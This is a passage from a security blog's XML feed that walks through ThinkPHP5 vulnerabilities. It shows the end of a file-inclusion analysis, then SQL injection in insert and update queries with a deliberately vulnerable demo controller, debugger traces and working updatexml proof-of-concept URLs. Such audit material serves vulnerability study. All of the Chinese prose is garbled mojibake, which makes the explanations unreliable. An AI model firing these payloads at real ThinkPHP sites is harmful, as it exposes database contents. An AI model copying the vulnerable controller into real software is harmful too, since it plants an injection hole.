æ­¤ç”¨æˆ·çš„æ•°æ®è¾“å…¥ï¼Œç»è¿‡<code>get</code>æ–¹æ³•å’Œ<code>assign</code>æ–¹æ³•åï¼Œè¿”å›çš„å†…å®¹ä¸º<code>cacheFile=favico.ico</code> ï¼Œç„¶åç¨‹åºç»§ç»­è°ƒç”¨<code>fetch</code>æ–¹æ³•è¿›è¡Œå¤„ç†ã€‚</p><blockquote><p>fetchæ–¹æ³•ç”¨äºåŠ è½½æ¨¡æ¿è¾“å‡ºã€‚è¿™é‡Œå¦‚æœæˆ‘ä»¬æ²¡æœ‰æŒ‡å®šæ¨¡æ¿åç§°ï¼Œå…¶ä¼šä½¿ç”¨é»˜è®¤çš„æ–‡ä»¶ä½œä¸ºæ¨¡æ¿ï¼Œæ¨¡æ¿è·¯å¾„ç±»ä¼¼ <strong>å½“å‰æ¨¡å—/é»˜è®¤è§†å›¾ç›®å½•/å½“å‰æ§åˆ¶å™¨ï¼ˆå°å†™ï¼‰/å½“å‰æ“ä½œï¼ˆå°å†™ï¼‰.html</strong> ï¼Œå¦‚æœé»˜è®¤è·¯å¾„æ¨¡æ¿ä¸å­˜åœ¨ï¼Œç¨‹åºå°±ä¼šæŠ¥é”™ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185135.png" alt="image-20200916183120261"></p><p>è·Ÿè¿›åˆ° <strong>Template</strong> ç±»çš„ <strong>fetch</strong> æ–¹æ³•ï¼Œå¯ä»¥å‘ç°å¯æ§å˜é‡ <strong>$vars</strong> èµ‹å€¼ç»™ <strong>$this-&gt;data</strong> å¹¶æœ€ç»ˆä¼ å…¥ <strong>File</strong> ç±»çš„ <strong>read</strong> æ–¹æ³•ã€‚è€Œ <strong>read</strong> æ–¹æ³•ä¸­åœ¨ä½¿ç”¨äº† <strong>extract</strong> å‡½æ•°åï¼Œç›´æ¥åŒ…å«äº† <strong>$cacheFile</strong> å˜é‡ã€‚è¿™é‡Œå°±æ˜¯æ¼æ´å‘ç”Ÿçš„å…³é”®åŸå› ï¼ˆå¯ä»¥é€šè¿‡ <strong>extract</strong> å‡½æ•°ï¼Œç›´æ¥è¦†ç›– <strong>$cacheFile</strong> å˜é‡ï¼Œå› ä¸º <strong>extract</strong> å‡½æ•°ä¸­çš„å‚æ•° <strong>$vars</strong> å¯ä»¥ç”±ç”¨æˆ·æ§åˆ¶ï¼‰ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185154.png" alt="image-20200916184005912"></p><p>æ–¹æ³•è°ƒç”¨æ ˆï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185205.png" alt="image-20200916184215051"></p><h2 id="åˆ©ç”¨æ€»ç»“"><a href="#åˆ©ç”¨æ€»ç»“" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185135.png" alt="image-20200916183120261"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185825.png" alt="7"></p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185031.png" alt="image-20200916161144712"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´&quot;&gt;&lt;a href=&quot;#ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´&quot;&gt;&lt;/a&gt;ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´&lt;/h2&gt;&lt;h2 id=&quot;</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="æ–‡ä»¶åŒ…å«" scheme="https://hack-for.fun/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5æ¼æ´å­¦ä¹ -SQLæ³¨å…¥</title>
    <link href="https://hack-for.fun/69fea760.html"/>
    <id>https://hack-for.fun/69fea760.html</id>
    <published>2020-09-13T05:40:27.000Z</published>
    <updated>2020-09-23T03:04:24.409Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>å‚è€ƒèµ„æ–™ï¼š<a href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a></p><p>ç¯å¢ƒå‡†å¤‡ï¼š</p><ul><li>PHPStorm + MAMP PRO</li></ul><p>ç¯å¢ƒæ­å»ºå¯ä»¥çœ‹æˆ‘å‰ä¸¤ç¯‡æ–‡ç« ã€‚</p><ul><li>composer</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew install composer</span><br><span class="line">composer config -g repo.packagist composer https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;composer&#x2F;</span><br></pre></td></tr></table></figure><ul><li>è·å–å¤ç°ä»£ç </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think&#x3D;5.0.15 tpdemo</span><br></pre></td></tr></table></figure><p>å°† <strong>composer.json</strong> æ–‡ä»¶çš„ <strong>require</strong> å­—æ®µè®¾ç½®æˆå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;&#x3D;5.4.0&quot;,</span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;5.0.15&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>SQL æ³¨å…¥demo ç¯å¢ƒ</li></ul><p>ä¿®æ”¹<code>/application/index/controller/index.php</code> çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        db(<span class="string">&#x27;users&#x27;</span>)-&gt;insert([<span class="string">&#x27;username&#x27;</span> =&gt; $username]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æ¨¡æ‹Ÿè¿™é‡Œå­˜åœ¨ä¸€ä¸ªç”¨æˆ·ä¼ å‚å¹¶ä¸æ•°æ®åº“äº¤äº’çš„åœºæ™¯ã€‚</p></blockquote><p>å¯èƒ½ä¼šå­˜åœ¨ï¼ŒSQL æŠ¥é”™</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191229.png" alt="image-20200913135221064"></p><p>ä¿®æ”¹username å­—æ®µé»˜è®¤ä¸º<code>NULL</code>  å³å¯è§£å†³é—®é¢˜ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191250.png" alt="image-20200913134825568"></p><h1 id="SQLæ³¨å…¥ä¸€-insert"><a href="#SQLæ³¨å…¥ä¸€-insert" class="headerlink" title="SQLæ³¨å…¥ä¸€(insert)"></a>SQLæ³¨å…¥ä¸€(insert)</h1><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public&#x2F;index&#x2F;index?username[0]&#x3D;inc&amp;username[1]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]&#x3D;1 </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191832.png" alt="image-20200913134332556"></p><h2 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>5.0.13&lt;=ThinkPHP&lt;=5.0.15</strong> ã€ <strong>5.1.0&lt;=ThinkPHP&lt;=5.1.5</strong></p><h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>æœ¬æ¬¡æ¼æ´å­˜åœ¨äº <strong>Builder</strong> ç±»çš„ <strong>parseData</strong> æ–¹æ³•ä¸­ã€‚ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œå°†æ•°æ®æ‹¼æ¥è¿› <strong>SQL</strong> è¯­å¥ï¼Œå¯¼è‡´ <strong>SQLæ³¨å…¥æ¼æ´</strong> çš„äº§ç”Ÿã€‚</p><p>ç±»å‹ï¼š<code>insert</code> æ³¨å…¥ã€‚</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><blockquote><p>å¯¹äºå¼€æºé¡¹ç›®ï¼Œåœ¨issue æˆ–è€… commit \ Releases è®°å½•ä¸­ï¼Œå°±èƒ½æ‰¾åˆ°å†å²æ¼æ´ä¿¡æ¯ã€‚è¿™ä¸€ç‚¹åœ¨CTFä¸­ç»å¸¸ç”¨åˆ°ï¼Œå°¤å…¶æ˜¯Node.js çš„ç¬¬ä¸‰æ–¹ä¾èµ–æ¼æ´ã€‚</p></blockquote><p>ä»æ¼æ´å½±å“ç‰ˆæœ¬å¯ä»¥å»æ‰¾ å·²ç»ä¿®å¤åçš„ç‰ˆæœ¬ï¼Œ<a href="https://github.com/top-think/framework/releases/tag/v5.0.16">https://github.com/top-think/framework/releases/tag/v5.0.16</a></p><p>é€šè¿‡github çš„<code>compare</code>åŠŸèƒ½ï¼Œå³å¯æŸ¥çœ‹ä»£ç å‘ç”Ÿäº†å“ªäº›ä¿®æ”¹ã€‚</p><p><a href="https://github.com/top-think/framework/compare/v5.0.16...master">https://github.com/top-think/framework/compare/v5.0.16...master</a></p><p>åœ¨<code>/thinkphp/library/think/db/Connection.php</code> çš„ 314ï¼Œ 316 è¡Œä¸‹æ–­ç‚¹Debugï¼Œæ‰“payloadã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191848.png" alt="image-20200913141903209"></p><p>INSERT INTO <code>users</code> (<code>username</code>) VALUES (updatexml(1,concat(0x7,user(),0x7e),1)+1) </p><p>åŒæ—¶æˆåŠŸæ”»å‡»çš„Payload æ‰€åœ¨çš„å‚æ•°ä½äº <code>username[1]</code> çš„ <code>value</code>  ã€‚</p><p>æ”»å‡»Payload ç»è¿‡ThinkPHP çš„å†…ç½®è¿‡æ»¤åï¼Œè¿›å…¥<code>$this-&gt;builder</code> çš„<code>Query</code> ç±»çš„<code>insert</code> æ–¹æ³•ï¼Œæ‰§è¡Œå…¶ä¸­çš„SQLè¯­å¥ï¼Œå¹¶åœ¨åé¢è¿”å›å‡ºäº†æ‰§è¡Œç»“æœã€‚å› ä¸ºPayloadåˆ©ç”¨<code>updatexml()</code>æ¥æŠ¥é”™ï¼Œå› æ­¤å¿…é¡»å¼€å¯<code>app_debug</code> æ¥å¼€å¯SQL æŠ¥é”™ä¿¡æ¯ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192007.png" alt="image-20200913155142684"></p><p>(å¦‚ä¸Šå›¾debug ç»“æœä¸­Query.phpï¼‰ï¼Œ<code>$this-&gt;builder</code> ä¸º <code>think\db\builder\Mysql</code> ç±»ï¼Œ<code>Query</code> çš„å®šä¹‰ä½äº <code>thinkphp/library/think/db/builder/Mysql.php</code> </p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192026.png" alt="image-20200913161424839"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192043.png" alt="image-20200913161552092"></p><p>åœ¨<code>/thinkphp/library/think/db/builder/Mysql.php</code> , <code>Mysql</code> ç±»ç»§æ‰¿äº<code>Builder</code> ç±»ï¼Œå³ä¸Šé¢çš„ <strong>$this-&gt;builder-&gt;insert()</strong> æœ€ç»ˆè°ƒç”¨çš„æ˜¯ <strong>Builder</strong> ç±»çš„ <strong>insert</strong> æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192059.png" alt="image-20200913162209236"></p><p>æ–¹æ³•è°ƒç”¨<code>parseData()</code>æ–¹æ³•æ¥åˆ†æå¹¶å¤„ç†æ•°æ®ï¼Œè·Ÿè¿›è¯¥æ–¹æ³•ã€‚</p><p><code>/thinkphp/library/think/db/Builder.php</code> </p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913193005.png" alt="image-20200913163148214"></p><p>åœ¨<code>inc</code> å’Œ <code>dec</code> çš„ æƒ…å†µä¸‹ï¼Œå°†å¯æ§æ•°æ®<code>$val[1]</code>é€šè¿‡<code>parseKey</code>æ–¹æ³•å¤„ç†åï¼Œè¿›è¡Œæ‹¼æ¥ï¼Œå¹¶è¿”å›<code>$result</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192945.png" alt="image-20200913185951795"></p><p><code>parseKey</code>æ–¹æ³• ä¸åšä»»ä½•å¤„ç†ï¼Œæ˜¯ç›´æ¥è¿”å›å€¼çš„ä¸€ä¸ªæ–¹æ³•ã€‚</p><blockquote><p>å› æ­¤ï¼Œå¸¦æœ‰æ¶æ„SQL è¯­å¥çš„Payloadï¼Œè¢«æ‹¼æ¥ä¸”æ²¡ä»»ä½•å­—ç¬¦ä¸²å½¢å¼å¤„ç†åœ¨Builderç±»çš„insertæ–¹æ³•ä¸­ï¼Œé€šè¿‡str_replaceå‡½æ•°ç›´æ¥æ›¿æ¢ï¼Œè¿”å›sqlï¼Œå¸¦å…¥SQLè¯­å¥ä¸­è¢«æ‰§è¡Œï¼Œé€ æˆäº†SQLæ³¨å…¥æ¼æ´ã€‚</p></blockquote><p>åœ¨<code>thinkphp/library/think/Request.php</code> ä¸­ï¼Œæœ‰è°ƒç”¨å†…ç½®è¿‡æ»¤ï¼ˆç›´æ¥æ›¿æ¢ä¸ºç©ºï¼‰æ–¹æ³•ï¼Œå¯¹å‚æ•°<code>exp</code>è¿›è¡Œè¿‡æ»¤ï¼Œåœ¨case <code>exp</code>çš„æƒ…å†µä¸‹ï¼Œæ— æ³•é€ æˆæ¼æ´ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192928.png" alt="carbon"></p><p>é—®é¢˜ï¼šä¸ºä»€ä¹ˆä¸èƒ½å°†æ¶æ„Payload ç”¨<code>username[2]</code> æ¥æŠ•é€’ï¼Ÿ</p><p>åŸå› ï¼š</p><p>åŒæ ·çš„åŠæ³•ï¼Œä¸‹æ–­ç‚¹ï¼Œdebug å¯ä»¥çœ‹åˆ°ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192915.png" alt="image-20200913181025221"></p><p>å›åˆ°ä¹‹å‰çš„<code>parseDate</code> æ–¹æ³•ï¼Œ<code>username[2]</code>çš„å€¼é€šè¿‡<code>floatval</code>å‡½æ•°å¤„ç†</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192902.png" alt="image-20200913171023035"></p><p>payload å˜ä¸ºäº†<code>0</code> ï¼Œä¸” ä¼šå­˜åœ¨SQL é”™è¯¯ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192852.png" alt="image-20200913182241348"></p><h2 id="åˆ©ç”¨æ€»ç»“"><a href="#åˆ©ç”¨æ€»ç»“" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192749.png" alt="image-20200913185834897"></p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192803.png" alt="image-20200913151252661"></p><h1 id="SQLæ³¨å…¥äºŒ-update"><a href="#SQLæ³¨å…¥äºŒ-update" class="headerlink" title="SQLæ³¨å…¥äºŒ(update)"></a>SQLæ³¨å…¥äºŒ(update)</h1><p>å¤ç°ä»£ç è·å–ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think&#x3D;5.1  tpdemo3</span><br></pre></td></tr></table></figure><p>å°† <strong>composer.json</strong> æ–‡ä»¶çš„ <strong>require</strong> å­—æ®µè®¾ç½®æˆå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;&#x3D;5.6.0&quot;,</span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;5.1.7&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>../config/app.php</code> ä¸­ï¼Œéœ€è¦ä¿®æ”¹<code>app_trace</code> ä¸ºtrueï¼Œ <code>app_debug</code> é»˜è®¤å¼€å¯äº†ã€‚</p><p>åˆ›å»ºæ•°æ®åº“ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create database tpdemo;</span><br><span class="line">use tpdemo;</span><br><span class="line">create table users(</span><br><span class="line">id int primary key auto_increment,</span><br><span class="line">username varchar(50) not null</span><br><span class="line">);</span><br><span class="line">insert into users(id,username) values(1,&#39;testuser&#39;);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¹Ÿè¦è®¾ç½®username å­—æ®µ ä¸º<code>NULL</code> æ‰è¡Œ</p><p>ä¿®æ”¹<code>/application/index/controller/index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        db(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&#x27;id&#x27;</span> =&gt; <span class="number">1</span>])-&gt;update([<span class="string">&#x27;username&#x27;</span> =&gt; $username]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index&#x2F;index?username[0]&#x3D;point&amp;username[1]&#x3D;1&amp;username[2]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]&#x3D;0</span><br></pre></td></tr></table></figure><p>å¾ˆSQL æ³¨å…¥ä¸€éå¸¸ç±»ä¼¼ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203133.png" alt="image-20200914152750668"></p><h2 id="å½±å“ç‰ˆæœ¬-1"><a href="#å½±å“ç‰ˆæœ¬-1" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p>æ¼æ´å½±å“ç‰ˆæœ¬ï¼š <strong>5.1.6&lt;=ThinkPHP&lt;=5.1.7</strong> (éæœ€æ–°çš„ <strong>5.1.8</strong> ç‰ˆæœ¬ä¹Ÿå¯åˆ©ç”¨)ã€‚</p><h2 id="æ¼æ´æ¦‚è¿°-1"><a href="#æ¼æ´æ¦‚è¿°-1" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>æœ¬æ¬¡æ¼æ´å­˜åœ¨äº <strong>Mysql</strong> ç±»çš„ <strong>parseArrayData</strong> æ–¹æ³•ä¸­ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œå°†æ•°æ®æ‹¼æ¥è¿› <strong>SQL</strong> è¯­å¥ï¼Œå¯¼è‡´ <strong>SQLæ³¨å…¥æ¼æ´</strong> çš„äº§ç”Ÿ</p><p>æ³¨å…¥ç±»å‹ï¼š<code>update</code> æ³¨å…¥</p><h2 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><blockquote><p>å¯¹äºå¼€æºé¡¹ç›®ï¼Œåœ¨issue æˆ–è€… commit \ Releases è®°å½•ä¸­ï¼Œå°±èƒ½æ‰¾åˆ°å†å²æ¼æ´ä¿¡æ¯ã€‚è¿™ä¸€ç‚¹åœ¨CTFä¸­ç»å¸¸ç”¨åˆ°ï¼Œå°¤å…¶æ˜¯Node.js çš„ç¬¬ä¸‰æ–¹ä¾èµ–æ¼æ´ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203118.png" alt="image-20200914161022479"></p><ul><li>ä¸‹æ–­ç‚¹ï¼Œdebugã€‚è§‚å¯Ÿå‚æ•°ä¼ é€’è¿‡ç¨‹</li><li>ç›‘æ§MySQL</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203111.png" alt="image-20200914184917592"></p><hr><p>ä¸‹æ–­ç‚¹ï¼Œå¼€å¯Debugï¼Œæ‰“Payloadã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202218.png" alt="image-20200914173011583"></p><p><code>../thinkphp/library/think/db/Query.php</code> ä¸­ï¼ŒPayload ä¼ å…¥Query ç±»çš„ <code>update</code>æ–¹æ³•ï¼Œè·Ÿè¿›è¯¥æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è°ƒç”¨äº†<code>Connection</code> ç±»çš„è¯¥æ–¹æ³•ä¸º<code>update</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•åˆè°ƒç”¨äº† </p><p><code>$this-&gt;builder</code> çš„<code>update</code> æ–¹æ³•ï¼Œæ­¤å¤„çš„<code>$this-&gt;builder</code> ä¸ºä¸º<code>think\db\builder\Mysql</code> ç±»ã€‚<code>class Mysql extends Builder</code> ï¼Œè¯¥ç±»ç»§æ‰¿äº<code>Builder</code> ç±»ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202201.png" alt="image-20200914170732409"></p><p>åœ¨<code>Builder</code>ç±»ä¸­çš„<code>update</code>æ–¹æ³•ï¼Œè°ƒç”¨äº†<code>parseData</code>æ–¹æ³•ï¼Œï¼ˆæ­£å¦‚ä¸Šå›¾debugç»“æœã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202036.png" alt="image-20200914184754350"></p><p>åœ¨è¯¥æ–¹æ³•ä¸­çš„<code>swich</code>è¯­å¥ä¸­ï¼Œä¹‹å‰å‡ºç°è¿‡æ¼æ´ï¼Œç°åœ¨å¤šäº†ä¸€æ¡default è¯­å¥ã€‚è€Œåœ¨æ–°ç‰ˆæœ¬ä¸­è¢«åˆ é™¤äº†ã€‚</p><p>è·Ÿè¿›åˆ°<code>parseData</code> æ–¹æ³•ï¼Œå‘ç°Payload åˆè¢«<code>parseArrayData</code>æ–¹æ³•å¤„ç†ï¼Œç»§ç»­è·Ÿè¿›ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202026.png" alt="image-20200914185836504"></p><p>åœ¨<code>../thinkphp/library/think/db/builder/Mysql.php</code> ä¸­çš„ 200 è¡Œè¿”å›result çš„åœ°æ–¹æ‰“æ–­ç‚¹ï¼Œè°ƒè¯•ç»“æœå¦‚ä¸‹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202011.png"></p><p>æ­¤å¤„å°†å¯æ§å˜é‡ç»è¿‡æ‹¼æ¥åè¢«å¸¦å…¥æ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201959.png" alt="image-20200914193548748"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseArrayData</span>(<span class="params">Query $query, $data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">list</span>($type, $value) = $data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (strtolower($type)) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;point&#x27;</span>:</span><br><span class="line">            $fun   = <span class="keyword">isset</span>($data[<span class="number">2</span>]) ? $data[<span class="number">2</span>] : <span class="string">&#x27;GeomFromText&#x27;</span>;</span><br><span class="line">            $point = <span class="keyword">isset</span>($data[<span class="number">3</span>]) ? $data[<span class="number">3</span>] : <span class="string">&#x27;POINT&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">                $value = implode(<span class="string">&#x27; &#x27;</span>, $value);</span><br><span class="line">            &#125;</span><br><span class="line">            $result = $fun . <span class="string">&#x27;(\&#x27;&#x27;</span> . $point . <span class="string">&#x27;(&#x27;</span> . $value . <span class="string">&#x27;)\&#x27;)&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $result = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result = $fun . <span class="string">&#x27;(\&#x27;&#x27;</span> . $point . <span class="string">&#x27;(&#x27;</span> . $value . <span class="string">&#x27;)\&#x27;)&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ä¸‰ä¸ªå˜é‡å‡å¯æ§ã€‚å½¢å¼ä¸ºï¼š<code>$a(&#39;$b($c)&#39;)</code> 